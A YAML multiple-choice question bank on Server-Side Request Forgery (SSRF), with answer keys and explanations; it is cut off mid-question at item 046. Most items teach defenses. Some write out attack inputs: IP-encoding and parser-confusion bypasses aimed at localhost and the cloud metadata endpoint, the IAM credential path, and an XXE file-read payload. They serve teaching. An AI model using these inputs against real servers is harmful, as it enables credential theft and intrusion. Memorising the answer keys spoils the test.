topic: SSRF & Server-Side Request Attacks
domain: security
topic_slug: ssrf-and-server-side-request-attacks
version: 1
questions:
- id: ssrf-and-server-side-request-attacks-001
  difficulty: beginner
  tags:
  - definition
  - fundamentals
  question: |
    What best defines Server-Side Request Forgery (SSRF)?
  options:
  - An attacker tricks a server into making an attacker-controlled outbound request
  - An attacker forges cookies to impersonate another user on the server
  - An attacker injects SQL into a server-side database query
  - An attacker floods a server with requests to exhaust its resources
  answer: 0
  explanation: |
    SSRF is when a server is coerced into making a request to a destination the attacker
    controls. The server lends its network position and identity, reaching resources the
    attacker could not reach directly.
  ref: concepts.md#what-ssrf-is
- id: ssrf-and-server-side-request-attacks-002
  difficulty: beginner
  tags:
  - owasp
  - classification
  question: |
    Which OWASP Top 10 2021 category is dedicated to SSRF?
  options:
  - A01:2021 – Broken Access Control
  - A10:2021 – Server-Side Request Forgery
  - A03:2021 – Injection
  - A07:2021 – Identification and Authentication Failures
  answer: 1
  explanation: |
    SSRF was added as its own category, A10:2021 – Server-Side Request Forgery, in the
    OWASP Top 10 2021, promoted by the community survey due to its severity and prevalence.
  ref: concepts.md#what-ssrf-is
- id: ssrf-and-server-side-request-attacks-003
  difficulty: beginner
  tags:
  - impact
  - cloud-metadata
  question: |
    Why is the cloud instance metadata endpoint (169.254.169.254) considered the
    highest-impact SSRF target?
  options:
  - It can be used to force a kernel panic that reboots and crashes the instance
  - It reveals only the instance's public DNS hostname and nothing else of value
  - It exposes temporary IAM/role credentials that can lead to account compromise
  - It allows changing the instance's security group rules directly
  answer: 2
  explanation: |
    The metadata service exposes short-lived IAM role credentials (e.g. at
    /latest/meta-data/iam/security-credentials/). Stealing them can lead to broad cloud
    account compromise — the essence of the Capital One 2019 breach.
  ref: concepts.md#impact-and-attack-surface
- id: ssrf-and-server-side-request-attacks-004
  difficulty: intermediate
  tags:
  - impact
  - breach
  question: |
    The 2019 Capital One breach is the canonical SSRF case study. What did the attacker
    ultimately obtain through the SSRF?
  options:
  - Plaintext user passwords from the login page
  - TLS private keys from the load balancer
  - Database backups from an S3 bucket via SQL injection
  - IAM credentials from the EC2 instance metadata service
  answer: 3
  explanation: |
    The SSRF reached the EC2 metadata service (IMDSv1) and retrieved the instance role's
    IAM credentials, which were then used to access data. It is the textbook SSRF →
    credential-theft → cloud-compromise chain.
  ref: concepts.md#impact-and-attack-surface
- id: ssrf-and-server-side-request-attacks-005
  difficulty: beginner
  tags:
  - impact
  - internal-access
  question: |
    Besides cloud metadata, which of the following is a typical SSRF impact?
  options:
  - Decrypting captured TLS traffic on the wire by recovering the session keys
  - Bypassing the browser's same-origin policy to read cross-domain responses
  - Reaching internal-only admin panels and services behind the firewall
  - Forging valid JWT signatures by leaking the server's HMAC signing secret
  answer: 2
  explanation: |
    Because the request originates inside the trust boundary, SSRF can reach internal
    admin consoles, databases, key-value stores, and microservices unreachable from the
    public internet.
  ref: concepts.md#impact-and-attack-surface
- id: ssrf-and-server-side-request-attacks-006
  difficulty: intermediate
  tags:
  - port-scanning
  - blind
  question: |
    How can an attacker use SSRF to port-scan an internal network even when the response
    body is never returned?
  options:
  - By observing timing and status/error differences between open, closed, and filtered ports
  - By reading the Content-Length header the fetcher reports for each internal page it retrieves
  - By decoding the server's TLS certificate to enumerate the ports listed in its SAN extension
  - It is impossible to port scan through SSRF at all unless the full response body is returned
  answer: 0
  explanation: |
    Semi-blind SSRF turns response timing (fast connection-refused vs. slow filtered
    timeout) and status/error differences into an oracle that reveals which internal
    hosts and ports are open.
  ref: concepts.md#in-band-blind-and-semi-blind-ssrf
- id: ssrf-and-server-side-request-attacks-007
  difficulty: intermediate
  tags:
  - blind
  - oob
  question: |
    You suspect a blind SSRF where nothing is reflected in the response. What is the
    standard way to confirm the vulnerability?
  options:
  - Compare the byte length of two responses and infer the request happened from the difference
  - Read the server's error stack trace, which blind SSRF is guaranteed to print for every failed fetch
  - Send a stored XSS payload in the URL and confirm it executes in the victim admin's browser
  - Point the server at a domain/URL you control and watch for an out-of-band DNS or HTTP callback
  answer: 3
  explanation: |
    Blind SSRF is confirmed with an out-of-band (OOB) interaction: point the server at a
    listener you control (Collaborator/interactsh/your own DNS+HTTP server); a callback
    proves the server made the request.
  ref: concepts.md#in-band-blind-and-semi-blind-ssrf
- id: ssrf-and-server-side-request-attacks-008
  difficulty: beginner
  tags:
  - in-band
  - blind
  - definitions
  question: |
    What distinguishes in-band SSRF from blind SSRF?
  options:
  - In-band SSRF works only over HTTPS endpoints, while blind SSRF is possible only over plain HTTP
  - In-band SSRF reflects the fetched response to the attacker; blind SSRF reflects nothing
  - In-band SSRF can target only relational databases, whereas blind SSRF targets only caching layers
  - There is no real difference; the two terms are interchangeable synonyms for the same technique
  answer: 1
  explanation: |
    In-band SSRF returns the fetched content to the attacker directly. Blind SSRF returns
    nothing observable, so it must be confirmed and exploited via out-of-band channels or
    side-effect oracles.
  ref: concepts.md#in-band-blind-and-semi-blind-ssrf
- id: ssrf-and-server-side-request-attacks-009
  difficulty: intermediate
  tags:
  - schemes
  - gopher
  - rce
  question: |
    Which URL scheme is most associated with escalating SSRF to remote code execution
    because it lets an attacker send arbitrary bytes to a TCP port?
  options:
  - https://
  - 'mailto:'
  - gopher://
  - 'blob:'
  answer: 2
  explanation: |
    gopher:// lets an attacker craft arbitrary bytes to a target port, so a single URL can
    script a full Redis/FastCGI/SMTP request. This is the canonical SSRF-to-RCE path
    (e.g. writing a cron job via an unauthenticated Redis).
  ref: concepts.md#dangerous-url-schemes-and-protocol-smuggling
- id: ssrf-and-server-side-request-attacks-010
  difficulty: beginner
  tags:
  - schemes
  - file
  question: |
    An SSRF-able fetcher accepts the URL file:///etc/passwd and returns its contents.
    What went wrong?
  options:
  - The client failed to validate the TLS certificate before reading the file contents
  - The DNS resolver was misconfigured and mapped the file path to a local loopback address
  - The response body was not gzip-compressed, so the raw file bytes were returned verbatim
  - The client honored the file:// scheme instead of restricting to http/https
  answer: 3
  explanation: |
    Allowing the file:// scheme lets SSRF read local files. The fix is to restrict the
    client to only the schemes you actually need — typically http and https.
  ref: concepts.md#dangerous-url-schemes-and-protocol-smuggling
- id: ssrf-and-server-side-request-attacks-011
  difficulty: intermediate
  tags:
  - schemes
  - defense
  question: |
    Which is the correct default policy for URL schemes in an outbound fetcher that only
    needs to download web content?
  options:
  - Allow only http and https and reject every other scheme
  - Allow all schemes and rely on the firewall to block the dangerous ones
  - Block only file:// and gopher:// and allow everything else
  - Allow any scheme but disable TLS verification
  answer: 0
  explanation: |
    Use a scheme allowlist: permit only http/https and reject file, gopher, dict, ftp,
    data, and the rest. Denylisting individual dangerous schemes is fragile.
  ref: concepts.md#dangerous-url-schemes-and-protocol-smuggling
- id: ssrf-and-server-side-request-attacks-012
  difficulty: intermediate
  tags:
  - imds
  - aws
  - defense
  question: |
    What makes IMDSv2 more resistant to SSRF than IMDSv1?
  options:
  - IMDSv2 encrypts the metadata payload with mutual TLS and a per-instance client certificate
  - IMDSv2 requires a PUT to obtain a session token plus a custom token header on GETs, which most SSRF
    fetchers cannot send
  - IMDSv2 relocates the endpoint to a routable public IP address protected by a security-group rule
  - IMDSv2 requires the caller to solve a CAPTCHA challenge before any metadata GET is answered
  answer: 1
  explanation: |
    IMDSv2 uses a session handshake: a PUT to /latest/api/token returns a token that must
    be sent in the X-aws-ec2-metadata-token header on every GET. Most SSRF primitives can
    only issue GETs without custom headers, so they cannot obtain a token.
  ref: concepts.md#cloud-metadata-imdsv1-versus-imdsv2
- id: ssrf-and-server-side-request-attacks-013
  difficulty: advanced
  tags:
  - imds
  - hop-limit
  question: |
    By default, the IMDSv2 PUT token response has an IP-level hop limit of 1. Why does this
    help defend against SSRF?
  options:
  - It caps the total number of bytes the metadata service will return in the token response body
  - It forces the issued token to expire after exactly one second, before an attacker can reuse it
  - It restricts the token so it authorizes only a single subsequent metadata GET before becoming invalid
  - A request proxied through an extra network hop (reverse proxy or container) has the token response
    dropped
  answer: 3
  explanation: |
    The hop-limit of 1 means the token response cannot traverse an additional hop, so
    SSRF routed through a reverse proxy or a container network layer loses the token
    response — blocking a common SSRF path to metadata.
  ref: concepts.md#cloud-metadata-imdsv1-versus-imdsv2
- id: ssrf-and-server-side-request-attacks-014
  difficulty: intermediate
  tags:
  - imds
  - headers
  question: |
    Which header does an IMDSv2 client send to request a session token, and which header
    carries the token on subsequent metadata reads?
  options:
  - 'Authorization: Bearer on the PUT; Cookie on the GET'
  - Metadata-Flavor on both requests
  - X-aws-ec2-metadata-token-ttl-seconds on the PUT; X-aws-ec2-metadata-token on the GET
  - X-Forwarded-For on the PUT; X-Real-IP on the GET
  answer: 2
  explanation: |
    The PUT to /latest/api/token includes X-aws-ec2-metadata-token-ttl-seconds (TTL, up to
    21600s). The returned token is then sent in X-aws-ec2-metadata-token on every GET.
  ref: concepts.md#cloud-metadata-imdsv1-versus-imdsv2
- id: ssrf-and-server-side-request-attacks-015
  difficulty: advanced
  tags:
  - imds
  - limitations
  question: |
    Which statement about IMDSv2 as an SSRF control is most accurate?
  options:
  - IMDSv2 fixes the SSRF vulnerability itself in the application
  - 'IMDSv2 is defense in depth: it removes a high-value target but the underlying SSRF must still be
    fixed'
  - IMDSv2 makes egress filtering unnecessary
  - IMDSv2 blocks all outbound requests from the instance
  answer: 1
  explanation: |
    IMDSv2 hardens the metadata target but does nothing about the application's SSRF flaw.
    A powerful SSRF primitive that can PUT and set headers could still reach it. Fix the
    SSRF, enforce IMDSv2, and filter egress.
  ref: concepts.md#cloud-metadata-imdsv1-versus-imdsv2
- id: ssrf-and-server-side-request-attacks-016
  difficulty: intermediate
  tags:
  - imds
  - config
  question: |
    Which instance metadata configuration best mitigates credential-stealing SSRF on AWS?
  options:
  - HttpTokens=required (IMDSv2 only) with HttpPutResponseHopLimit=1, or disable IMDS entirely if unused
  - HttpTokens=optional so both IMDSv1 and IMDSv2 keep working for maximum SDK backward compatibility
  - Raise HttpPutResponseHopLimit to 64 so deeply nested container networks can still reach the endpoint
  - Expose the metadata service on a routable public IP guarded by a static password and security group
  answer: 0
  explanation: |
    Setting HttpTokens=required enforces IMDSv2 (disabling IMDSv1), and keeping the hop
    limit at 1 blocks proxied access. If the workload doesn't need metadata, disable IMDS.
  ref: concepts.md#cloud-metadata-imdsv1-versus-imdsv2
- id: ssrf-and-server-side-request-attacks-017
  difficulty: intermediate
  tags:
  - bypass
  - ip-encoding
  question: |
    A denylist blocks the literal string "127.0.0.1". Which of these still reaches
    localhost?
  options:
  - http://example.com/127.0.0.1
  - http://256.256.256.256/
  - http://2130706433/
  - http://0.0.0.256/
  answer: 2
  explanation: |
    2130706433 is the 32-bit decimal (dword) representation of 127.0.0.1, which the OS
    resolver accepts. It bypasses a string denylist. 256.x is not a valid octet.
  ref: concepts.md#bypasses-ip-encodings-and-address-tricks
- id: ssrf-and-server-side-request-attacks-018
  difficulty: intermediate
  tags:
  - bypass
  - ip-encoding
  question: |
    Which of the following is an octal representation of 127.0.0.1 used to bypass naive
    filters?
  options:
  - http://0x7f000001/
  - http://127.1/
  - http://[::1]/
  - http://0177.0.0.1/
  answer: 3
  explanation: |
    0177 is octal for 127. Hex would be 0x7f..., 127.1 is octet-shorthand, and [::1] is
    the IPv6 loopback — all valid loopback forms, but the octal one is 0177.0.0.1.
  ref: concepts.md#bypasses-ip-encodings-and-address-tricks
- id: ssrf-and-server-side-request-attacks-019
  difficulty: intermediate
  tags:
  - bypass
  - ipv6
  question: |
    How can an attacker express 169.254.169.254 to evade an IPv4-only denylist?
  options:
  - http://169.254.169.254.example.com/
  - http://[::ffff:169.254.169.254]/ (IPv6-mapped IPv4)
  - http://169-254-169-254.nip.example/
  - https://169.254.169.254:0/latest/meta-data/
  answer: 1
  explanation: |
    The IPv6-mapped IPv4 form [::ffff:169.254.169.254] resolves to the same link-local
    metadata address but slips past filters that only match IPv4 dotted-decimal strings.
  ref: concepts.md#bypasses-ip-encodings-and-address-tricks
- id: ssrf-and-server-side-request-attacks-020
  difficulty: intermediate
  tags:
  - bypass
  - dns
  question: |
    Services like nip.io and sslip.io are abused in SSRF because they:
  options:
  - Map arbitrary IP addresses into legitimate-looking hostnames that resolve to that IP
  - Provide free wildcard TLS certificates that validate for any internal hostname
  - Anonymize the fetcher's outbound requests by relaying them through the Tor network
  - Disable the browser's same-origin policy so cross-domain responses become readable
  answer: 0
  explanation: |
    Wildcard-DNS services resolve names like 10.0.0.5.nip.io directly to 10.0.0.5, letting
    an attacker hide an internal target inside a public-looking hostname.
  ref: concepts.md#bypasses-ip-encodings-and-address-tricks
- id: ssrf-and-server-side-request-attacks-021
  difficulty: advanced
  tags:
  - defense
  - ip-validation
  question: |
    What is the robust way to validate that a target address is not internal, given all
    the encoding tricks?
  options:
  - Maintain a large regular expression enumerating every forbidden IP string form
  - Reject any URL whose host component contains a numeric digit character
  - Only allow URLs whose total length stays under thirty characters
  - Resolve the hostname and compare the numeric IP object against blocked CIDR ranges
  answer: 3
  explanation: |
    Comparing the normalized numeric IP (parsed into an IP-address object) against blocked
    CIDR ranges neutralizes every textual encoding at once. String/regex denylists are
    bypass-prone.
  ref: concepts.md#bypasses-ip-encodings-and-address-tricks
- id: ssrf-and-server-side-request-attacks-022
  difficulty: advanced
  tags:
  - dns-rebinding
  - toctou
  question: |
    An application resolves a hostname, confirms it maps to a public IP, then makes the
    request by resolving the hostname again. Why is this still vulnerable?
  options:
  - The second DNS resolution runs slower and simply times out before connecting
  - The public IP verified during the check might actually sit behind a shared CDN
  - 'DNS rebinding: an attacker-controlled low-TTL record can return a public IP for the check and an
    internal IP at connect time'
  - An HTTPS certificate cannot be validated twice across the two separate lookups
  answer: 2
  explanation: |
    This is a TOCTOU (time-of-check to time-of-use) flaw called DNS rebinding. Between the
    validating lookup and the connecting lookup, the attacker's DNS server switches the
    answer to an internal/link-local IP.
  ref: concepts.md#dns-rebinding-and-toctou
- id: ssrf-and-server-side-request-attacks-023
  difficulty: advanced
  tags:
  - dns-rebinding
  - defense
  question: |
    What is the correct defense against DNS rebinding in an SSRF-sensitive fetcher?
  options:
  - Resolve once, validate the resolved IP, then connect to that exact pinned IP (not re-resolve the name)
  - Cache DNS answers for 24 hours
  - Only accept hostnames, never IP literals
  - Follow all redirects to reach the final host
  answer: 0
  explanation: |
    Pin the validated IP: resolve, check the IP is public/allowlisted, then connect to that
    literal IP (setting the Host header/SNI to the original name for TLS). This removes the
    second lookup the attacker would rebind.
  ref: concepts.md#dns-rebinding-and-toctou
- id: ssrf-and-server-side-request-attacks-024
  difficulty: advanced
  tags:
  - dns-rebinding
  - a-aaaa
  question: |
    A validator checks only the A record of a hostname and confirms it is public, but the
    HTTP client connects over IPv6. How is this exploited?
  options:
  - The IPv6 stack is always disabled on servers, so the AAAA connection never happens
  - The attacker publishes a malicious AAAA record pointing to an internal IPv6 address that is never
    validated
  - IPv6 addresses are globally routable by definition and can never be internal
  - The validated A record automatically overrides and cancels any AAAA record present
  answer: 1
  explanation: |
    Validating only the A record leaves the AAAA record unchecked; the client may connect
    over IPv6 to a malicious internal address. Resolve and validate all A and AAAA records.
  ref: concepts.md#dns-rebinding-and-toctou
- id: ssrf-and-server-side-request-attacks-025
  difficulty: intermediate
  tags:
  - bypass
  - redirect
  question: |
    An app validates the initial URL is on an allowed public host, then fetches it and
    follows redirects. How does an attacker abuse this?
  options:
  - By sending an extremely long URL that overflows the allowlist string comparison buffer
  - By forcing the connection to use HTTP/2 multiplexing so the host check is skipped entirely
  - The allowed host returns a 302 Location to http://169.254.169.254/, and the client follows it unchecked
  - By compressing the response body with gzip so the validator cannot inspect the target host
  answer: 2
  explanation: |
    Redirect-based bypass: validation only inspected the first URL. The trusted host issues
    a redirect to an internal target, and the client follows it without re-validating.
  ref: concepts.md#bypasses-redirects-and-url-parser-confusion
- id: ssrf-and-server-side-request-attacks-026
  difficulty: intermediate
  tags:
  - redirect
  - defense
  question: |
    Which pair of measures correctly mitigates redirect-based SSRF bypasses?
  options:
  - Enable automatic redirect following and trust the first host, since it was already allowlisted
  - Follow only HTTPS redirect targets, assuming a valid TLS handshake proves the host is safe
  - Cap the total number of redirect hops at 100 so a redirect loop cannot exhaust the client
  - Disable automatic redirect following, or re-run full IP validation on every redirect hop
  answer: 3
  explanation: |
    Either disable auto-follow entirely, or validate the resolved IP of each redirect
    target (and restrict redirect protocols to http/https). Validating only the first URL
    is the flaw.
  ref: concepts.md#bypasses-redirects-and-url-parser-confusion
- id: ssrf-and-server-side-request-attacks-027
  difficulty: advanced
  tags:
  - parser-confusion
  - bypass
  question: |
    Consider the URL http://expected-host@169.254.169.254/. Why can this bypass a host
    validator while the HTTP client connects to the metadata endpoint?
  options:
  - The @ character makes the parser treat the whole string as a path segment, not a host
  - The validator may read 'expected-host' as the host (userinfo confusion) while the client connects
    to the real host after the @
  - The URL is syntactically invalid, so both the validator and the client reject it outright
  - The address 169.254.169.254 is parsed as a port number rather than as the target host
  answer: 1
  explanation: |
    Everything before @ is userinfo (credentials); the true host is 169.254.169.254. A
    validator that grabs the part before @ sees expected-host, but the HTTP client connects
    to the address after the @ — classic parser-confusion SSRF.
  ref: concepts.md#bypasses-redirects-and-url-parser-confusion
- id: ssrf-and-server-side-request-attacks-028
  difficulty: advanced
  tags:
  - parser-confusion
  - defense
  question: |
    Which approach most reliably defeats URL-parser-confusion SSRF bypasses?
  options:
  - Use one well-tested parser for both validation and the request, reject userinfo/@, then resolve and
    pin the IP you connect to
  - Run two different URL parsers and require that their extracted hosts agree exactly
  - Lowercase the entire URL string before parsing to normalize any mixed-case host tricks
  - Strip all query-string parameters from the URL before handing it to the HTTP client
  answer: 0
  explanation: |
    Parser confusion arises when validation and the request layer disagree. Use a single
    parser, reject @/userinfo and odd characters, and — decisively — connect to the
    resolved, pinned IP so hostname disagreements can't route you anywhere unexpected.
  ref: concepts.md#bypasses-redirects-and-url-parser-confusion
- id: ssrf-and-server-side-request-attacks-029
  difficulty: beginner
  tags:
  - defense
  - allowlist
  question: |
    Which SSRF defense is preferred when the set of legitimate destinations is known in
    advance?
  options:
  - A denylist enumerating every known-bad internal IP address and metadata hostname
  - Blocking any outbound fetch whose response body exceeds one megabyte in size
  - Rate limiting the fetch endpoint to a fixed number of requests per client per minute
  - An allowlist of trusted hosts, schemes, ports, and path prefixes
  answer: 3
  explanation: |
    When destinations are knowable, use a strict allowlist of hosts (plus scheme, port, and
    path). OWASP is explicit: allowlists are preferred; denylists are bypass-prone.
  ref: concepts.md#defense-allowlist-and-re-resolve
- id: ssrf-and-server-side-request-attacks-030
  difficulty: intermediate
  tags:
  - defense
  - denylist
  question: |
    Why does OWASP warn against relying on a denylist alone to stop SSRF?
  options:
  - Denylists are too slow to evaluate at runtime and add latency to every outbound fetch
  - Alternate IP encodings, wildcard DNS, rebinding, redirects, and parser tricks all evade string matching
  - Denylists require a backing database that becomes a single point of failure for the fetcher
  - Denylists only take effect over HTTPS and are silently ignored for plain HTTP requests
  answer: 1
  explanation: |
    A denylist tries to enumerate every bad form, but attackers have many equivalent
    encodings and dynamic techniques. The positive check — allowlist plus resolved-IP
    range validation — is what actually holds.
  ref: concepts.md#defense-allowlist-and-re-resolve
- id: ssrf-and-server-side-request-attacks-031
  difficulty: intermediate
  tags:
  - defense
  - webhooks
  - case-2
  question: |
    For a public webhook feature (arbitrary external URLs are legitimate), an allowlist of
    hosts is impossible. What combination of controls is correct?
  options:
  - Trust any https URL, because a successful TLS handshake proves the endpoint is safe
  - Block only the literal string 169.254.169.254 and permit every other destination
  - Enforce http/https + allowed ports, resolve all A/AAAA records and require public IPs, pin the IP
    or re-validate redirects, and optionally require a secret token
  - Allow the request unconditionally but log the destination for later manual review
  answer: 2
  explanation: |
    In the Case-2 (unknown destinations) scenario you cannot allowlist hosts, so you must
    layer: scheme/port checks, resolve-and-verify-public on all records, IP pinning or
    redirect re-validation, and ideally a shared secret the endpoint echoes.
  ref: concepts.md#defense-allowlist-and-re-resolve
- id: ssrf-and-server-side-request-attacks-032
  difficulty: intermediate
  tags:
  - defense
  - ranges
  question: |
    Which set of ranges should a minimum SSRF denylist block (in addition to cloud
    metadata hostnames)?
  options:
  - Loopback (127.0.0.0/8, ::1), link-local (169.254.0.0/16, fe80::/10), RFC1918 private, CGNAT 100.64.0.0/10,
    and multicast
  - Only the 10.0.0.0/8 private range, since it is the most commonly used internal block
  - Only the public IP ranges assigned to your own cloud provider's regional data centers
  - Any address whose final octet is .1, since those are typically gateways and routers
  answer: 0
  explanation: |
    A minimum denylist must cover loopback, link-local (which includes the metadata IP),
    RFC 1918 private ranges, CGNAT (100.64.0.0/10), 0.0.0.0/8, and multicast — plus metadata
    hostnames. Even so, treat it as a supplement to allowlisting.
  ref: concepts.md#defense-allowlist-and-re-resolve
- id: ssrf-and-server-side-request-attacks-033
  difficulty: intermediate
  tags:
  - defense
  - input-handling
  question: |
    For a Case-1 internal-app fetcher, which input-handling practice reduces SSRF risk the
    most?
  options:
  - Accept a full user-supplied URL and pass it straight through to the outbound HTTP client
  - Accept only a validated identifier/enum from the user and build the URL server-side against the allowlist
  - Accept any URL from the user but strip the scheme prefix before sending the request
  - Accept URLs only from authenticated users and perform no other validation on the value
  answer: 1
  explanation: |
    Where possible, don't take a raw URL at all. Accept a constrained identifier and
    construct the destination server-side from the allowlist, eliminating attacker control
    over the host.
  ref: concepts.md#defense-allowlist-and-re-resolve
- id: ssrf-and-server-side-request-attacks-034
  difficulty: intermediate
  tags:
  - defense
  - egress
  question: |
    What is the role of network egress filtering in SSRF defense?
  options:
  - It fully replaces the need for any application-layer URL validation in the fetcher
  - It transparently encrypts all outbound traffic leaving the fetching service with TLS
  - It blocks inbound attacker requests from ever reaching the vulnerable application endpoint
  - It constrains outbound connections so that even a perfect SSRF cannot reach internal targets or metadata
  answer: 3
  explanation: |
    Egress filtering is defense in depth at the network layer: restrict a fetching
    service's outbound rules to only what it needs, denying access to metadata, RFC 1918,
    and other internal ranges — so an app-layer bug has nowhere valuable to go.
  ref: concepts.md#defense-network-egress-filtering-and-defense-in-depth
- id: ssrf-and-server-side-request-attacks-035
  difficulty: intermediate
  tags:
  - defense
  - architecture
  question: |
    A design routes all user-driven outbound fetches through a single hardened egress
    proxy in an isolated network segment. What is the main benefit for SSRF?
  options:
  - It speeds up repeated fetches by caching previously retrieved responses at the proxy
  - It removes the need for TLS on outbound connections since the proxy is already trusted
  - It centralizes allowlist/IP enforcement and isolates fetching from internal services and metadata
  - It eliminates the need for authentication on the internal services behind the proxy
  answer: 2
  explanation: |
    A dedicated fetch/forward proxy centralizes the SSRF controls and lives in a segment
    with no access to internal services or metadata, so a bypass reaches nothing sensitive.
  ref: concepts.md#defense-network-egress-filtering-and-defense-in-depth
- id: ssrf-and-server-side-request-attacks-036
  difficulty: intermediate
  tags:
  - defense
  - least-privilege
  question: |
    Even with SSRF fixed, why is least-privilege IAM on the instance role still important?
  options:
  - If credentials ever leak, a narrowly scoped role limits how useful they are to an attacker
  - It makes the instance metadata service respond faster to credential requests
  - It prevents the instance from booting at all until its IAM permissions are attached
  - It disables the instance metadata service entirely once the role is scoped down
  answer: 0
  explanation: |
    Defense in depth: if any credential leaks (via SSRF or otherwise), a least-privilege
    role that grants only what the workload needs sharply limits the blast radius.
  ref: concepts.md#defense-network-egress-filtering-and-defense-in-depth
- id: ssrf-and-server-side-request-attacks-037
  difficulty: advanced
  tags:
  - defense
  - zero-trust
  question: |
    SSRF succeeds partly because internal services assume "if you can reach me, you are
    trusted." What principle counters this assumption?
  options:
  - Perimeter-only security, hardening the edge firewall while implicitly trusting hosts already inside it
  - Security through obscurity, hiding internal hostnames and ports and assuming attackers cannot ever find them
  - Disabling logging on internal services so malicious internal calls leave no audit trail to investigate
  - 'Zero trust: internal services authenticate every caller rather than trusting network origin'
  answer: 3
  explanation: |
    Zero trust removes the implicit trust in network location. If internal services require
    authenticated, authorized callers, an SSRF that merely reaches them still cannot act.
  ref: concepts.md#defense-network-egress-filtering-and-defense-in-depth
- id: ssrf-and-server-side-request-attacks-038
  difficulty: beginner
  tags:
  - webhooks
  - features
  question: |
    Which product feature is a classic hiding place for SSRF because it inherently fetches
    user-supplied URLs?
  options:
  - A static CSS stylesheet server that delivers cached front-end assets
  - A client-side password strength meter widget shown on signup
  - A webhook / callback URL configured by the user
  - A purely client-side calendar date-picker control
  answer: 2
  explanation: |
    Webhooks let a user specify a callback URL that the server then connects to — a textbook
    SSRF surface (a Case-2 scenario requiring public-IP validation on every delivery).
  ref: concepts.md#ssrf-in-webhooks-fetchers-and-url-previews
- id: ssrf-and-server-side-request-attacks-039
  difficulty: intermediate
  tags:
  - pdf
  - renderer
  - features
  question: |
    Why are server-side HTML-to-PDF / HTML-to-image renderers (e.g. headless Chromium,
    wkhtmltopdf) prone to SSRF and local-file disclosure?
  options:
  - They compress the rendered images poorly, producing large output files but never any outbound requests
  - They fetch embedded resources — img src, iframes, CSS url(), and may follow file:// or internal URLs
    in attacker HTML
  - They require the host to hold a routable public IP address before the rendering engine will start
  - They cannot render CSS stylesheets, so any embedded external references in the markup are simply ignored
  answer: 1
  explanation: |
    A renderer fed attacker HTML will fetch the embedded resources it references, including
    internal URLs or file:// paths, pulling metadata or local files into the generated PDF/
    image.
  ref: concepts.md#ssrf-in-webhooks-fetchers-and-url-previews
- id: ssrf-and-server-side-request-attacks-040
  difficulty: beginner
  tags:
  - url-preview
  - features
  question: |
    Chat and social apps that fetch a URL to render a title/thumbnail (link unfurling) have
    repeatedly had SSRF. What is the underlying reason?
  options:
  - The server fetches a user-supplied URL to build the preview, so an attacker can point it at internal
    targets
  - They store the submitted URL in a database table and index it for later full-text search queries
  - They render the entire link preview purely inside the user's own browser with no server-side fetch
  - They authenticate every preview request with an OAuth bearer token before building the thumbnail
  answer: 0
  explanation: |
    Link previews/unfurling require the server to fetch the URL (for Open Graph tags), which
    is exactly a user-controlled server-side request — SSRF unless the destination is
    validated and IP-pinned.
  ref: concepts.md#ssrf-in-webhooks-fetchers-and-url-previews
- id: ssrf-and-server-side-request-attacks-041
  difficulty: intermediate
  tags:
  - features
  - defense
  question: |
    What is the common defense across all URL-fetching features (webhooks, previews,
    importers, PDF generators)?
  options:
  - Writing different bespoke validation logic for each feature so every fetcher has its own custom checks
  - Disabling the fetching features only in the production environment while leaving them open in staging
  - Route every fetch through the same validated, IP-pinned, scheme-restricted, egress-filtered path
  - Only permitting authenticated users to trigger the fetches, relying on login as the sole SSRF control
  answer: 2
  explanation: |
    Treat every feature that turns user input into an outbound connection as SSRF-sensitive
    and funnel it through one hardened fetch path (validate, resolve, pin IP, restrict
    schemes/redirects, egress-filter).
  ref: concepts.md#ssrf-in-webhooks-fetchers-and-url-previews
- id: ssrf-and-server-side-request-attacks-042
  difficulty: intermediate
  tags:
  - xxe
  - related
  question: |
    How is XML External Entity (XXE) injection related to SSRF?
  options:
  - XXE is a variant of SQL injection that targets XML-backed databases and has no relation to SSRF
  - XXE can force an XML parser to fetch a SYSTEM URL (e.g. http://169.254.169.254/...), acting as an
    SSRF/file-read delivery mechanism
  - XXE only results in stored cross-site scripting when the parsed XML is later echoed to a browser
  - XXE and SSRF are simply two interchangeable names for one identical parser-abuse vulnerability
  answer: 1
  explanation: |
    An external entity with a SYSTEM URL makes the parser fetch that URL, so XXE is one way
    to deliver SSRF (and to read local files via file://). Interviewers commonly pair them.
  ref: concepts.md#xxe-as-a-related-vector
- id: ssrf-and-server-side-request-attacks-043
  difficulty: intermediate
  tags:
  - xxe
  - payload
  question: |
    Given this XML, what is the attacker trying to achieve?
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <data>&xxe;</data>
  options:
  - Cause a memory-corrupting buffer overflow in the XML parser's entity-handling routine
  - Perform an SQL injection against the database backing the XML document store
  - Trigger a cross-site request forgery using the victim's authenticated browser session
  - Read a local file (/etc/passwd) by resolving an external entity
  answer: 3
  explanation: |
    The external entity xxe references file:///etc/passwd; if the parser resolves external
    entities, its contents are substituted into the document and disclosed — a local-file
    read via XXE.
  ref: concepts.md#xxe-as-a-related-vector
- id: ssrf-and-server-side-request-attacks-044
  difficulty: intermediate
  tags:
  - xxe
  - defense
  question: |
    What is the single most effective defense against XXE?
  options:
  - Disable DTD processing and external entity resolution in the XML parser
  - Validate every incoming XML document against a strict XSD schema before the parser reads it
  - Base64-encode all XML input on the client so the parser only ever sees an opaque encoded blob
  - Rate-limit XML upload requests to a fixed number per client per minute at the API gateway
  answer: 0
  explanation: |
    Disabling DTDs and external general/parameter entity resolution (secure-processing /
    disallow-doctype-decl) removes the mechanism XXE relies on. Prefer JSON where possible.
  ref: concepts.md#xxe-as-a-related-vector
- id: ssrf-and-server-side-request-attacks-045
  difficulty: advanced
  tags:
  - xxe
  - blind
  - dos
  question: |
    Which statement about advanced XXE is correct?
  options:
  - XXE cannot be exploited at all whenever the resolved entity value is not reflected back in the response
  - Blind XXE can exfiltrate data out-of-band via a malicious external DTD, and entity expansion can cause
    a 'billion laughs' DoS
  - XXE only affects SOAP web services and has no impact on plain REST endpoints that accept XML bodies
  - The billion-laughs attack works by stealing cached IAM credentials from the parsing server's memory
  answer: 1
  explanation: |
    When the entity isn't reflected, blind XXE uses parameter entities and an external DTD
    to exfiltrate data out-of-band. Separately, recursive entity expansion (billion laughs)
    is a denial-of-service vector.
  ref: concepts.md#xxe-as-a-related-vector
- id: ssrf-and-server-side-request-attacks-046
  difficulty: intermediate
  tags:
  - ssrf-vs-csrf
  - concepts
  question: |
    What is the key difference between SSRF and CSRF?
  options:
  - They are fundamentally the same attack described under two different but equivalent acronyms
  - CSRF only functions over encrypted HTTPS connections, whereas SSRF works exclusively over plain HTTP
